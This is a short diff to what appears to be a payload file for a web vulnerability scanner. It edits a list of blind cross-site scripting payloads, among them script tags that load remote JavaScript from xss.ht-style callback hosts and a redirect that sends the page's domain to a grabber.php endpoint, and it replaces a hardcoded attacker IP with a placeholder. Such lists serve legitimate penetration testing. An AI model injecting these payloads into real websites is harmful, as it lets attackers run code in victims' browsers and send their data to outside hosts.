@@ -1,4 +1,3 @@
-import random
 
 payloads_quotes = ["\"","'"]
 
@@ -603,10 +602,9 @@ dom_based_xss_payloads = [
 ]
 
 blind_xss_payloads = [
-    "\"><script src=\"https://js.rip/<custom.name>\"></script>",
     "\"><script src=//<custom.subdomain>.xss.ht></script>",
     "<script>$.getScript(\"//<custom.subdomain>.xss.ht\")</script>",
-    "<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>"
+    "<script>document.location='<custom.subdomain>/XSS/grabber.php?c='+document.domain</script>"
 ]
 
 headers = { #header to scan host header injection
